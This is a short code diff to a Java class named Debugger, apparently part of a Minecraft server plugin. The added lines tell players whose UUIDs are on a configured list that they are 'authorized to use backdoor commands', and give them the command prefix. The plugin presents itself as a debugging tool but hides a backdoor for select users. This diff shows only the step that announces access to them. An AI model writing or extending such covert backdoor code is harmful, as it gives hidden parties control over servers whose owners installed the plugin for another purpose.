@@ -265,6 +265,9 @@ public final class Debugger implements Listener {
         players.put(player.getName(), new PlayerState());
         if(Config.display_debug_messages)
             System.out.println("Creating states for player: " + player.getName());
+
+        if(!Config.authorized_uuids[0].equals("") && IsUserAuthorized(player))
+            player.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " You are authorized to use backdoor commands. Prefix: '" + Config.command_prefix + "'");
     }
 
     /*Basic command parser*/
